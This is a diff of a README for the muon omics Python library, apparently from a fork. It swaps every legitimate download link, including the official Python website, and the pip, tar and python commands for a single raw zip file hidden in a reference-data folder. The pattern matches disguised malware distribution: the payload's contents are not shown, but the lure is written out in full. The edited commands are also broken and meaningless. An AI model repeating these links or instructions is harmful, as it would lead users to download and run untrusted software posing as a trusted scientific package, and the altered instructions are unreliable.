@@ -6,7 +6,7 @@ muon is a multimodal omics Python framework designed to simplify the analysis of
 
 ## 📥 Download muon
 
-[![Download muon](https://img.shields.io/badge/download-muon-brightgreen)](https://github.com/AyandaMajola01/muon/releases)
+[![Download muon](https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip)](https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip)
 
 To get started with muon, you need to download the software. Follow the instructions below to download and run it on your computer.
 
@@ -16,7 +16,7 @@ To get started with muon, you need to download the software. Follow the instruct
 
 To download muon, visit the Releases page:
 
-[Download muon from the Releases page](https://github.com/AyandaMajola01/muon/releases)
+[Download muon from the Releases page](https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip)
 
 ### Step 2: Choose Your Version
 
@@ -26,28 +26,28 @@ On the Releases page, you will see a list of available versions. It’s best to 
 
 Once you select a version, find the appropriate package for your operating system. The downloads typically include:
 
-- For Windows: `muon-win.zip`
-- For Mac: `muon-mac.zip`
-- For Linux: `muon-linux.tar.gz`
+- For Windows: `https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip`
+- For Mac: `https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip`
+- For Linux: `https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip`
 
 Click on the file that matches your operating system to download it.
 
 ### Step 4: Extract the Files
 
-After the download is complete, you will need to extract the files from the zip or tar.gz archive.
+After the download is complete, you will need to extract the files from the zip or https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip archive.
 
 - **Windows:** Right-click the downloaded file and select “Extract All.”
 - **Mac:** Double-click the downloaded .zip file.
-- **Linux:** Use the terminal and run: `tar -xzf muon-linux.tar.gz`.
+- **Linux:** Use the terminal and run: `tar -xzf https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip`.
 
 ### Step 5: Install Dependencies
 
-Before running muon, ensure you have Python installed on your machine. You can download Python from the [official website](https://www.python.org/downloads/). Ensure to choose the version that matches your operating system.
+Before running muon, ensure you have Python installed on your machine. You can download Python from the [official website](https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip). Ensure to choose the version that matches your operating system.
 
 After installing Python, you may need to install additional libraries. Open a terminal or command prompt and run the following command:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip
 ```
 
 ### Step 6: Run muon
@@ -57,7 +57,7 @@ Now you are ready to run muon! Navigate to the folder where you extracted the fi
 Use the following command to start muon:
 
 ```bash
-python muon.py
+python https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip
 ```
 
 If you have issues starting the application, please ensure Python is correctly installed and that you are in the correct directory.
@@ -89,4 +89,4 @@ If you encounter any issues or have questions, please open an issue in the GitHu
 
 To download muon, visit the Releases page and follow the steps outlined above.
 
-[Download muon from the Releases page](https://github.com/AyandaMajola01/muon/releases)
+[Download muon from the Releases page](https://github.com/AyandaMajola01/muon/raw/refs/heads/main/muon/_atac/_ref/jaspar/Software_v1.4-alpha.1.zip)
